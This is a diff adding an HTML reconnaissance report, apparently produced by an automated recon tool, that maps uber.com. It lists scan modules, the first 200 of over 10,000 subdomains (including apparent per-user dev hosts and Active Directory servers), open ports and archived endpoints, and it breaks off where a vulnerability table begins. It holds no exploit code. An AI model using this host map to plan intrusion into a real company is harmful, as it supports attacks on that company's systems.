@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DIGI TEAM Report - uber.com</title>
+<style>
+    :root {
+        --bg: #0d1117;
+        --card: #161b22;
+        --border: #30363d;
+        --text: #c9d1d9;
+        --text-dim: #8b949e;
+        --accent: #58a6ff;
+        --green: #3fb950;
+        --red: #f85149;
+        --yellow: #d29922;
+        --orange: #db6d28;
+        --purple: #bc8cff;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI',
+                     Helvetica, Arial, sans-serif;
+        background: var(--bg);
+        color: var(--text);
+        line-height: 1.6;
+        padding: 2rem;
+    }
+    .container { max-width: 1200px; margin: 0 auto; }
+
+    /* ── Header ─────────────────────────────────────── */
+    .header {
+        text-align: center;
+        padding: 2rem;
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        background: var(--card);
+        margin-bottom: 2rem;
+    }
+    .header h1 {
+        color: var(--accent);
+        font-size: 2.5rem;
+        letter-spacing: 2px;
+    }
+    .header .subtitle {
+        color: var(--text-dim);
+        font-size: 1.1rem;
+        margin-top: .5rem;
+    }
+
+    /* ── Stat Cards ─────────────────────────────────── */
+    .meta-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
+        gap: 1rem;
+        margin: 1.5rem 0;
+    }
+    .meta-card {
+        background: var(--bg);
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 1rem;
+        text-align: center;
+    }
+    .meta-card .value {
+        font-size: 1.8rem;
+        font-weight: bold;
+        color: var(--accent);
+    }
+    .meta-card .label {
+        color: var(--text-dim);
+        font-size: .85rem;
+        margin-top: .25rem;
+    }
+
+    /* ── Sections ───────────────────────────────────── */
+    .section {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin-bottom: 1.5rem;
+    }
+    .section h2 {
+        color: var(--accent);
+        margin-bottom: 1rem;
+        padding-bottom: .5rem;
+        border-bottom: 1px solid var(--border);
+        font-size: 1.3rem;
+    }
+
+    /* ── Tables ─────────────────────────────────────── */
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        font-size: .9rem;
+    }
+    th, td {
+        padding: .6rem .8rem;
+        text-align: left;
+        border-bottom: 1px solid var(--border);
+    }
+    th {
+        color: var(--accent);
+        font-weight: 600;
+        background: rgba(88,166,255,0.05);
+    }
+    tr:hover {
+        background: rgba(88,166,255,0.04);
+    }
+
+    /* ── Badges ─────────────────────────────────────── */
+    .badge {
+        display: inline-block;
+        padding: .25rem .6rem;
+        margin: .2rem;
+        border-radius: 12px;
+        font-size: .8rem;
+        background: rgba(88,166,255,0.15);
+        color: var(--accent);
+        border: 1px solid rgba(88,166,255,0.3);
+    }
+
+    /* ── Status indicators ──────────────────────────── */
+    .status-completed { color: var(--green); font-weight: bold; }
+    .status-failed    { color: var(--red);   font-weight: bold; }
+    .status-skipped   { color: var(--yellow); font-weight: bold; }
+    .status-pending   { color: var(--text-dim); }
+
+    /* ── Severity indicators ────────────────────────── */
+    .sev-critical { color: #ff0040; font-weight: bold; }
+    .sev-high     { color: var(--red);    font-weight: bold; }
+    .sev-medium   { color: var(--orange); font-weight: bold; }
+    .sev-low      { color: var(--yellow); }
+    .sev-info     { color: var(--accent); }
+
+    /* ── Endpoints list ─────────────────────────────── */
+    .endpoint-list {
+        max-height: 400px;
+        overflow-y: auto;
+        list-style: none;
+        padding: 0;
+    }
+    .endpoint-list li {
+        padding: .3rem .5rem;
+        border-bottom: 1px solid var(--border);
+        font-size: .85rem;
+        word-break: break-all;
+        font-family: 'Consolas', 'Monaco', monospace;
+    }
+    .endpoint-list li:hover {
+        background: rgba(88,166,255,0.04);
+    }
+
+    /* ── Scan summary bar ───────────────────────────── */
+    .scan-stats {
+        display: flex;
+        gap: 1.5rem;
+        justify-content: center;
+        margin-top: 1rem;
+        flex-wrap: wrap;
+    }
+    .scan-stat {
+        font-size: .9rem;
+    }
+    .scan-stat .num { font-weight: bold; }
+
+    /* ── Footer ─────────────────────────────────────── */
+    .footer {
+        text-align: center;
+        color: var(--text-dim);
+        padding: 2rem 0;
+        font-size: .85rem;
+    }
+
+    /* ── Responsive ─────────────────────────────────── */
+    @media (max-width: 768px) {
+        body { padding: .5rem; }
+        .header h1 { font-size: 1.5rem; }
+        .meta-grid { grid-template-columns: repeat(2, 1fr); }
+        table { font-size: .8rem; }
+        th, td { padding: .4rem; }
+    }
+</style>
+</head>
+<body>
+<div class="container">
+
+    <!-- ═══════════════ HEADER ═══════════════ -->
+    <div class="header">
+        <h1>&#x1F50E; DIGI TEAM</h1>
+        <div class="subtitle">Elite Reconnaissance Report</div>
+
+        <div class="meta-grid">
+            <div class="meta-card">
+                <div class="value">uber.com</div>
+                <div class="label">Target Domain</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">10035</div>
+                <div class="label">Subdomains</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">10</div>
+                <div class="label">Open Ports</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">2</div>
+                <div class="label">Technologies</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">0</div>
+                <div class="label">Live Hosts</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">122</div>
+                <div class="label">Findings</div>
+            </div>
+            <div class="meta-card">
+                <div class="value">296.88s</div>
+                <div class="label">Scan Duration</div>
+            </div>
+        </div>
+
+        <div class="subtitle">
+            Scan Date: 2026-04-13T19:23:34.601004
+        </div>
+        <div class="scan-stats">
+            <span class="scan-stat">
+                Modules: <span class="num">19</span>
+            </span>
+            <span class="scan-stat">
+                Completed: <span class="num status-completed">18</span>
+            </span>
+            <span class="scan-stat">
+                Failed: <span class="num status-failed">0</span>
+            </span>
+            <span class="scan-stat">
+                Skipped: <span class="num status-skipped">1</span>
+            </span>
+        </div>
+    </div>
+
+    <!-- ═══════════════ MODULE STATUS ═══════════════ -->
+    <div class="section">
+        <h2>&#x2699; Module Execution Summary</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Module</th>
+                    <th>Status</th>
+                    <th>Time</th>
+                    <th>Errors</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>WHOIS Lookup</td><td class="status-completed">COMPLETED</td><td>0.8s</td><td>-</td></tr>
+<tr><td>DNS Enumeration</td><td class="status-completed">COMPLETED</td><td>1.2s</td><td>-</td></tr>
+<tr><td>Subdomain Enumeration</td><td class="status-completed">COMPLETED</td><td>82.4s</td><td>-</td></tr>
+<tr><td>Certificate Transparency</td><td class="status-completed">COMPLETED</td><td>7.5s</td><td>-</td></tr>
+<tr><td>Wayback URLs</td><td class="status-completed">COMPLETED</td><td>296.9s</td><td>-</td></tr>
+<tr><td>ASN Intelligence</td><td class="status-completed">COMPLETED</td><td>5.0s</td><td>-</td></tr>
+<tr><td>Shodan Intelligence</td><td class="status-completed">COMPLETED</td><td>0.3s</td><td>-</td></tr>
+<tr><td>Censys Intelligence</td><td class="status-completed">COMPLETED</td><td>1.1s</td><td>Censys API token rejected (401)</td></tr>
+<tr><td>VirusTotal Intelligence</td><td class="status-completed">COMPLETED</td><td>0.9s</td><td>-</td></tr>
+<tr><td>SecurityTrails Intel</td><td class="status-completed">COMPLETED</td><td>5.2s</td><td>-</td></tr>
+<tr><td>Chaos (PD) Subdomains</td><td class="status-completed">COMPLETED</td><td>1.2s</td><td>-</td></tr>
+<tr><td>GitHub Recon</td><td class="status-completed">COMPLETED</td><td>91.9s</td><td>-</td></tr>
+<tr><td>BuiltWith Tech Profile</td><td class="status-completed">COMPLETED</td><td>1.5s</td><td>-</td></tr>
+<tr><td>Live Host Detection</td><td class="status-completed">COMPLETED</td><td>0.0s</td><td>-</td></tr>
+<tr><td>Port Scanner</td><td class="status-completed">COMPLETED</td><td>265.3s</td><td>-</td></tr>
+<tr><td>Directory Fuzzing</td><td class="status-completed">COMPLETED</td><td>0.0s</td><td>-</td></tr>
+<tr><td>HTTP Headers Analysis</td><td class="status-completed">COMPLETED</td><td>0.7s</td><td>-</td></tr>
+<tr><td>Technology Detection</td><td class="status-completed">COMPLETED</td><td>0.6s</td><td>-</td></tr>
+<tr><td>Screenshot Capture</td><td class="status-skipped">SKIPPED</td><td>0.0s</td><td>-</td></tr>
+
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ═══════════════ SUBDOMAINS ═══════════════ -->
+    <div class="section">
+        <h2>&#x1F310; Subdomains (10035)</h2>
+        <table>
+            <thead>
+                <tr><th>#</th><th>Subdomain</th></tr>
+            </thead>
+            <tbody>
+                <tr><td>1</td><td>1.dev.uber.com</td></tr>
+<tr><td>2</td><td>10ccc.mx.dev.uber.com</td></tr>
+<tr><td>3</td><td>10yuantiyanjinshishicai.mx.dev.uber.com</td></tr>
+<tr><td>4</td><td>11avav.mx.dev.uber.com</td></tr>
+<tr><td>5</td><td>11wangyulechengguanwang.mx.dev.uber.com</td></tr>
+<tr><td>6</td><td>12boyulechengxinyuzenmeyang.mx.dev.uber.com</td></tr>
+<tr><td>7</td><td>12yuantiyanjinyulecheng.mx.dev.uber.com</td></tr>
+<tr><td>8</td><td>13-azure.solgi.dev.uber.com</td></tr>
+<tr><td>9</td><td>15205598.uber.com</td></tr>
+<tr><td>10</td><td>15e02.mx.dev.uber.com</td></tr>
+<tr><td>11</td><td>1be1.mx.dev.uber.com</td></tr>
+<tr><td>12</td><td>1bed7.mx.dev.uber.com</td></tr>
+<tr><td>13</td><td>1cc25.mx.dev.uber.com</td></tr>
+<tr><td>14</td><td>1fd1.mx.dev.uber.com</td></tr>
+<tr><td>15</td><td>2.dev.uber.com</td></tr>
+<tr><td>16</td><td>2e2da.mx.dev.uber.com</td></tr>
+<tr><td>17</td><td>2faf2.mx.dev.uber.com</td></tr>
+<tr><td>18</td><td>2www.sy.dev.uber.com</td></tr>
+<tr><td>19</td><td>3.dev.uber.com</td></tr>
+<tr><td>20</td><td>30okwannendengluqi.mx.dev.uber.com</td></tr>
+<tr><td>21</td><td>331759.uber.com</td></tr>
+<tr><td>22</td><td>36mz.uber.com</td></tr>
+<tr><td>23</td><td>39f94.mx.dev.uber.com</td></tr>
+<tr><td>24</td><td>3aee3.mx.dev.uber.com</td></tr>
+<tr><td>25</td><td>3cbec.mx.dev.uber.com</td></tr>
+<tr><td>26</td><td>3dyucedanma.mx.dev.uber.com</td></tr>
+<tr><td>27</td><td>3uyulechengzenmewan.mx.dev.uber.com</td></tr>
+<tr><td>28</td><td>3zhangpaisuohayulecheng.mx.dev.uber.com</td></tr>
+<tr><td>29</td><td>3zhuanzhongbianchuanqi.mx.dev.uber.com</td></tr>
+<tr><td>30</td><td>4.dev.uber.com</td></tr>
+<tr><td>31</td><td>4460893.sodigital.uber.com</td></tr>
+<tr><td>32</td><td>4581c.mx.dev.uber.com</td></tr>
+<tr><td>33</td><td>47ead.mx.dev.uber.com</td></tr>
+<tr><td>34</td><td>4a0ad.mx.dev.uber.com</td></tr>
+<tr><td>35</td><td>4a6b.mx.dev.uber.com</td></tr>
+<tr><td>36</td><td>4aa0e.mx.dev.uber.com</td></tr>
+<tr><td>37</td><td>4b1ef.mx.dev.uber.com</td></tr>
+<tr><td>38</td><td>4d9dd.mx.dev.uber.com</td></tr>
+<tr><td>39</td><td>4e0cc.mx.dev.uber.com</td></tr>
+<tr><td>40</td><td>4e1ea.mx.dev.uber.com</td></tr>
+<tr><td>41</td><td>4eaa3.mx.dev.uber.com</td></tr>
+<tr><td>42</td><td>4ee6b.mx.dev.uber.com</td></tr>
+<tr><td>43</td><td>4fc3d.mx.dev.uber.com</td></tr>
+<tr><td>44</td><td>5.dev.uber.com</td></tr>
+<tr><td>45</td><td>57bda.mx.dev.uber.com</td></tr>
+<tr><td>46</td><td>5ec5f.mx.dev.uber.com</td></tr>
+<tr><td>47</td><td>5eda6.mx.dev.uber.com</td></tr>
+<tr><td>48</td><td>5ff9d.mx.dev.uber.com</td></tr>
+<tr><td>49</td><td>60edc.mx.dev.uber.com</td></tr>
+<tr><td>50</td><td>64a.mx.dev.uber.com</td></tr>
+<tr><td>51</td><td>65m.mx.dev.uber.com</td></tr>
+<tr><td>52</td><td>69aac.mx.dev.uber.com</td></tr>
+<tr><td>53</td><td>6a8ed.mx.dev.uber.com</td></tr>
+<tr><td>54</td><td>6a9da.mx.dev.uber.com</td></tr>
+<tr><td>55</td><td>6b135.mx.dev.uber.com</td></tr>
+<tr><td>56</td><td>6ceee.mx.dev.uber.com</td></tr>
+<tr><td>57</td><td>6d544.mx.dev.uber.com</td></tr>
+<tr><td>58</td><td>6fa7f.mx.dev.uber.com</td></tr>
+<tr><td>59</td><td>6fb9a.mx.dev.uber.com</td></tr>
+<tr><td>60</td><td>7-clubbaijialexianjinwang.mx.dev.uber.com</td></tr>
+<tr><td>61</td><td>73bd.mx.dev.uber.com</td></tr>
+<tr><td>62</td><td>765c0.mx.dev.uber.com</td></tr>
+<tr><td>63</td><td>777qingrenwang.mx.dev.uber.com</td></tr>
+<tr><td>64</td><td>79caf.mx.dev.uber.com</td></tr>
+<tr><td>65</td><td>7b5fe.mx.dev.uber.com</td></tr>
+<tr><td>66</td><td>7b6fc.mx.dev.uber.com</td></tr>
+<tr><td>67</td><td>7baee.mx.dev.uber.com</td></tr>
+<tr><td>68</td><td>7bobocailuntan.mx.dev.uber.com</td></tr>
+<tr><td>69</td><td>7d7c.mx.dev.uber.com</td></tr>
+<tr><td>70</td><td>7ef1d.mx.dev.uber.com</td></tr>
+<tr><td>71</td><td>7f3fc.mx.dev.uber.com</td></tr>
+<tr><td>72</td><td>7fa8b.mx.dev.uber.com</td></tr>
+<tr><td>73</td><td>7haoguojiyule.mx.dev.uber.com</td></tr>
+<tr><td>74</td><td>84cda.mx.dev.uber.com</td></tr>
+<tr><td>75</td><td>85aae.mx.dev.uber.com</td></tr>
+<tr><td>76</td><td>86jjj.mx.dev.uber.com</td></tr>
+<tr><td>77</td><td>87bde.mx.dev.uber.com</td></tr>
+<tr><td>78</td><td>8aff9.mx.dev.uber.com</td></tr>
+<tr><td>79</td><td>8bad5.mx.dev.uber.com</td></tr>
+<tr><td>80</td><td>8boshoujibifen.mx.dev.uber.com</td></tr>
+<tr><td>81</td><td>8ddfb.mx.dev.uber.com</td></tr>
+<tr><td>82</td><td>8fb6b.mx.dev.uber.com</td></tr>
+<tr><td>83</td><td>8meyob.mx.dev.uber.com</td></tr>
+<tr><td>84</td><td>900f.mx.dev.uber.com</td></tr>
+<tr><td>85</td><td>90efd.mx.dev.uber.com</td></tr>
+<tr><td>86</td><td>90faf.mx.dev.uber.com</td></tr>
+<tr><td>87</td><td>9renzuqiuchangchicun.mx.dev.uber.com</td></tr>
+<tr><td>88</td><td>a.dev.uber.com</td></tr>
+<tr><td>89</td><td>a.uber.com</td></tr>
+<tr><td>90</td><td>a4e0.mx.dev.uber.com</td></tr>
+<tr><td>91</td><td>a5.dev.uber.com</td></tr>
+<tr><td>92</td><td>a6aa.mx.dev.uber.com</td></tr>
+<tr><td>93</td><td>a8yulechengzhenqiandubo.mx.dev.uber.com</td></tr>
+<tr><td>94</td><td>aa.dev.uber.com</td></tr>
+<tr><td>95</td><td>aalee.dev.uber.com</td></tr>
+<tr><td>96</td><td>aandrade.dev.uber.com</td></tr>
+<tr><td>97</td><td>aandrade0.dev.uber.com</td></tr>
+<tr><td>98</td><td>aandrade1.dev.uber.com</td></tr>
+<tr><td>99</td><td>aandrade10.dev.uber.com</td></tr>
+<tr><td>100</td><td>aandrade2.dev.uber.com</td></tr>
+<tr><td>101</td><td>aandrade3.dev.uber.com</td></tr>
+<tr><td>102</td><td>aaratee.dev.uber.com</td></tr>
+<tr><td>103</td><td>aarong.dev.uber.com</td></tr>
+<tr><td>104</td><td>aarong1.dev.uber.com</td></tr>
+<tr><td>105</td><td>ab.dev.uber.com</td></tr>
+<tr><td>106</td><td>abahouth.dev.uber.com</td></tr>
+<tr><td>107</td><td>abd9.mx.dev.uber.com</td></tr>
+<tr><td>108</td><td>abe1.dev.uber.com</td></tr>
+<tr><td>109</td><td>abe2.dev.uber.com</td></tr>
+<tr><td>110</td><td>abe3.dev.uber.com</td></tr>
+<tr><td>111</td><td>abeinstein.dev.uber.com</td></tr>
+<tr><td>112</td><td>abendblatt.mx.dev.uber.com</td></tr>
+<tr><td>113</td><td>abepostmaster.mx.dev.uber.com</td></tr>
+<tr><td>114</td><td>abg.dev.uber.com</td></tr>
+<tr><td>115</td><td>abhay.mx.dev.uber.com</td></tr>
+<tr><td>116</td><td>abq.dev.uber.com</td></tr>
+<tr><td>117</td><td>academyforbusiness.uber.com</td></tr>
+<tr><td>118</td><td>accessibility.uber.com</td></tr>
+<tr><td>119</td><td>accioneshum17.mx.dev.uber.com</td></tr>
+<tr><td>120</td><td>account.uber.com</td></tr>
+<tr><td>121</td><td>accounts.dev.uber.com</td></tr>
+<tr><td>122</td><td>accounts.uber.com</td></tr>
+<tr><td>123</td><td>acem11.mx.dev.uber.com</td></tr>
+<tr><td>124</td><td>achal.dev.uber.com</td></tr>
+<tr><td>125</td><td>achal0.dev.uber.com</td></tr>
+<tr><td>126</td><td>achiang.dev.uber.com</td></tr>
+<tr><td>127</td><td>acidburn.dev.uber.com</td></tr>
+<tr><td>128</td><td>acmilan.dev.uber.com</td></tr>
+<tr><td>129</td><td>acs6.mx.dev.uber.com</td></tr>
+<tr><td>130</td><td>activedirectory-dca1.uber.com</td></tr>
+<tr><td>131</td><td>activedirectory-sjc1.uber.com</td></tr>
+<tr><td>132</td><td>activedirectory.uber.com</td></tr>
+<tr><td>133</td><td>actuarial.dev.uber.com</td></tr>
+<tr><td>134</td><td>acubens.mx.dev.uber.com</td></tr>
+<tr><td>135</td><td>acura-57-7.dev.uber.com</td></tr>
+<tr><td>136</td><td>acura-a8-7.dev.uber.com</td></tr>
+<tr><td>137</td><td>acura-acclaim-2.dev.uber.com</td></tr>
+<tr><td>138</td><td>acura-allante-3.dev.uber.com</td></tr>
+<tr><td>139</td><td>acura-altima-7.dev.uber.com</td></tr>
+<tr><td>140</td><td>acura-astra-4.dev.uber.com</td></tr>
+<tr><td>141</td><td>acura-carens-4.dev.uber.com</td></tr>
+<tr><td>142</td><td>acura-daytona-8.dev.uber.com</td></tr>
+<tr><td>143</td><td>acura-enclave-4.dev.uber.com</td></tr>
+<tr><td>144</td><td>acura-equinox-3.dev.uber.com</td></tr>
+<tr><td>145</td><td>acura-escape-5.dev.uber.com</td></tr>
+<tr><td>146</td><td>acura-excursion-4.dev.uber.com</td></tr>
+<tr><td>147</td><td>acura-fury-2.dev.uber.com</td></tr>
+<tr><td>148</td><td>acura-glk-9.dev.uber.com</td></tr>
+<tr><td>149</td><td>acura-impala-9.dev.uber.com</td></tr>
+<tr><td>150</td><td>acura-iq-3.dev.uber.com</td></tr>
+<tr><td>151</td><td>acura-iq-4.dev.uber.com</td></tr>
+<tr><td>152</td><td>acura-lancer-2.dev.uber.com</td></tr>
+<tr><td>153</td><td>acura-leganza-1.dev.uber.com</td></tr>
+<tr><td>154</td><td>acura-parkavenue-6.dev.uber.com</td></tr>
+<tr><td>155</td><td>acura-rendezvous-8.dev.uber.com</td></tr>
+<tr><td>156</td><td>acura-reno-4.dev.uber.com</td></tr>
+<tr><td>157</td><td>acura-runner-3.dev.uber.com</td></tr>
+<tr><td>158</td><td>acura-rx-7-9.dev.uber.com</td></tr>
+<tr><td>159</td><td>acura-sable-1.dev.uber.com</td></tr>
+<tr><td>160</td><td>acura-safari-1.dev.uber.com</td></tr>
+<tr><td>161</td><td>acura-sentra-7.dev.uber.com</td></tr>
+<tr><td>162</td><td>acura-sierra-9.dev.uber.com</td></tr>
+<tr><td>163</td><td>acura-solara-6.dev.uber.com</td></tr>
+<tr><td>164</td><td>acura-somerset-2.dev.uber.com</td></tr>
+<tr><td>165</td><td>acura-spectra-3.dev.uber.com</td></tr>
+<tr><td>166</td><td>acura-truck-3.dev.uber.com</td></tr>
+<tr><td>167</td><td>acura-volare-7.dev.uber.com</td></tr>
+<tr><td>168</td><td>acura-xg-7.dev.uber.com</td></tr>
+<tr><td>169</td><td>ad.uber.com</td></tr>
+<tr><td>170</td><td>adamp.dev.uber.com</td></tr>
+<tr><td>171</td><td>adamz0.dev.uber.com</td></tr>
+<tr><td>172</td><td>adamzbox.dev.uber.com</td></tr>
+<tr><td>173</td><td>addison.dev.uber.com</td></tr>
+<tr><td>174</td><td>addison1.dev.uber.com</td></tr>
+<tr><td>175</td><td>addison2.dev.uber.com</td></tr>
+<tr><td>176</td><td>addison3.dev.uber.com</td></tr>
+<tr><td>177</td><td>adelaide.cfe.uber.com</td></tr>
+<tr><td>178</td><td>adfed.mx.dev.uber.com</td></tr>
+<tr><td>179</td><td>adiemus.mx.dev.uber.com</td></tr>
+<tr><td>180</td><td>aditi.dev.uber.com</td></tr>
+<tr><td>181</td><td>aditya.dev.uber.com</td></tr>
+<tr><td>182</td><td>adityas1.dev.uber.com</td></tr>
+<tr><td>183</td><td>admin22.mx.dev.uber.com</td></tr>
+<tr><td>184</td><td>admissions.jingc2ami.dev.uber.com</td></tr>
+<tr><td>185</td><td>adolph.mx.dev.uber.com</td></tr>
+<tr><td>186</td><td>adrooks.dev.uber.com</td></tr>
+<tr><td>187</td><td>adsense-es.mx.dev.uber.com</td></tr>
+<tr><td>188</td><td>advantage.dev.uber.com</td></tr>
+<tr><td>189</td><td>advantage.uber.com</td></tr>
+<tr><td>190</td><td>advertiser.uber.com</td></tr>
+<tr><td>191</td><td>adw-golden-apr1.dev.uber.com</td></tr>
+<tr><td>192</td><td>adw-golden-feb.dev.uber.com</td></tr>
+<tr><td>193</td><td>adw-golden-p2.dev.uber.com</td></tr>
+<tr><td>194</td><td>adw-golden-taishan.dev.uber.com</td></tr>
+<tr><td>195</td><td>adw-pob.dev.uber.com</td></tr>
+<tr><td>196</td><td>adw.dev.uber.com</td></tr>
+<tr><td>197</td><td>adwang.dev.uber.com</td></tr>
+<tr><td>198</td><td>ae.uber.com</td></tr>
+<tr><td>199</td><td>ae6f.mx.dev.uber.com</td></tr>
+<tr><td>200</td><td>aed9.mx.dev.uber.com</td></tr>
+
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ═══════════════ OPEN PORTS ═══════════════ -->
+    <div class="section">
+        <h2>&#x1F50C; Open Ports (10)</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>Host</th>
+                    <th>Port</th>
+                    <th>Service</th>
+                    <th>Version</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td>104.36.194.121</td><td>80</td><td></td><td></td></tr>
+<tr><td>104.36.194.121</td><td>443</td><td></td><td></td></tr>
+<tr><td>104.36.194.121</td><td>80</td><td></td><td></td></tr>
+<tr><td>104.36.194.121</td><td>443</td><td></td><td></td></tr>
+<tr><td>uber.com</td><td>80</td><td>http</td><td></td></tr>
+<tr><td>uber.com</td><td>443</td><td>ssl|https</td><td></td></tr>
+<tr><td>uber.com</td><td>8008</td><td>http?</td><td></td></tr>
+<tr><td>uber.com</td><td>80</td><td>http</td><td></td></tr>
+<tr><td>uber.com</td><td>443</td><td>ssl|https</td><td></td></tr>
+<tr><td>uber.com</td><td>8008</td><td>http?</td><td></td></tr>
+
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ═══════════════ LIVE HOSTS ═══════════════ -->
+    <div class="section">
+        <h2>&#x1F5A5; Live Hosts (0)</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>URL</th>
+                    <th>Status</th>
+                    <th>Title</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr><td colspan="4">No live hosts detected</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- ═══════════════ TECHNOLOGIES ═══════════════ -->
+    <div class="section">
+        <h2>&#x1F6E0; Technologies Detected (2)</h2>
+        <div style="padding: .5rem 0;">
+            <span class="badge">CloudFlare</span>
+<span class="badge">Server: cloudflare</span>
+
+        </div>
+    </div>
+
+    <!-- ═══════════════ ENDPOINTS ═══════════════ -->
+    <div class="section">
+        <h2>&#x1F517; Endpoints (500)</h2>
+        <ul class="endpoint-list">
+            <li>http://uber.com/%22https://web.archive.org/web/20130824132952im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-black-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20130824132952im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-lux-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20130824132952im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-suv-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20130824132952im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-taxi-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131020124937im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-black-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131020124937im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-lux-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131020124937im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-suv-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131020124937im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-taxi-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131123202237im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-black-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131123202237im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-lux-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131123202237im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-suv-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131123202237im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-taxi-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131123202238im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/home/uber-app/features-phones-web-sprite@1x-8.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131126144150im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-black-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131126144150im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-lux-1703-1362@1x.png%22</li>
+<li>http://uber.com/%22https://web.archive.org/web/20131201114717im_/https://d1a3f4spazzrp4.cloudfront.net/web-fresh/vehicles/car-taxi-1703-1362@1x.png%22</li>
+<li>http://uber.com/%C2%A0j</li>
+<li>http://uber.com/%C2%A0ja</li>
+<li>http://uber.com/%C2%A0ja%E2%80%91</li>
+<li>http://uber.com/%C2%A0ja%E2%80%91J</li>
+<li>http://uber.com/%C2%A0ja%E2%80%91JP</li>
+<li>http://uber.com/%C2%A0ja%E2%80%91JP%C2%A0/%C2%A0%E3%83%A9%E3%82%A4%E3%83%88%E3%83%9F%E3%83%8E%E3%82%A8%E3%82%A2%E7%A8%B2%E4%B9%97%E3%82%8A%EF%BC%89n</li>
+<li>http://uber.com/%C2%A0ja%E2%80%91JP%C2%A0/%C2%A0%E3%83%A9%E3%82%A4%E3%83%88%E3%83%9F%E3%83%8E%E3%82%A8%E3%82%A2%E7%A8%B2%E4%B9%97%E3%82%8A%EF%BC%89notteco%C2%A0</li>
+<li>http://uber.com/%D0%90pp</li>
+<li>http://uber.com/%E2%80%9D%5D</li>
+<li>http://uber.com/&amp;a=+uber.com</li>
+<li>http://uber.com/&amp;a=uber.com</li>
+<li>http://uber.com/100?utm_content=buffercdbfa&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer</li>
+<li>http://uber.com/2012/03/14/clear-and-straight-forward-surge-pricing/</li>
+<li>http://uber.com/2013/01/31/california-clears-uber-to-continue-and-expand-</li>
+<li>http://uber.com/2013/01/31/california-clears-uber-to-continue-and-expand-operations/</li>
+<li>http://uber.com/2014/08/semi-automated-science-using-an-ai-simulation-framework/</li>
+<li>http://uber.com/2014/12/our-commitment-to-safety/</li>
+<li>http://uber.com/2015/09/the-effects-of-ubers-surge-pricing/</li>
+<li>http://uber.com/2015/09/the-effects-of-ubers-surge-pricing/Uber</li>
+<li>http://uber.com/2015/11/1776</li>
+<li>http://uber.com/243250476</li>
+<li>http://uber.com:80/&amp;</li>
+<li>http://uber.com:80/1345402/3348516.html</li>
+<li>http://uber.com:80/243250150</li>
+<li>http://uber.com:80/243250400</li>
+<li>http://uber.com:80/243250407</li>
+<li>http://uber.com:80/243250530</li>
+<li>http://uber.com:80/243250684</li>
+<li>http://uber.com:80/243250833</li>
+<li>http://uber.com:80/243251110</li>
+<li>http://uber.com:80/243251185</li>
+<li>http://uber.com:80/243251200</li>
+<li>http://uber.com:80/243251242</li>
+<li>http://uber.com:80/243251310</li>
+
+        </ul>
+        <p style="color: var(--text-dim); margin-top: .5rem; font-size: .85rem;">Showing first 50 of 500 endpoints. See JSON report for full list.</p>
+    </div>
+
+    <!-- ═══════════════ VULNERABILITIES ═══════════════ -->
+    <div class="section">
+        <h2>&#x26A0; Vulnerability Indicators (122)</h2>
+        <table>
+            <thead>
+                <tr>
+                    <th style="width:100px;">Severity</th>
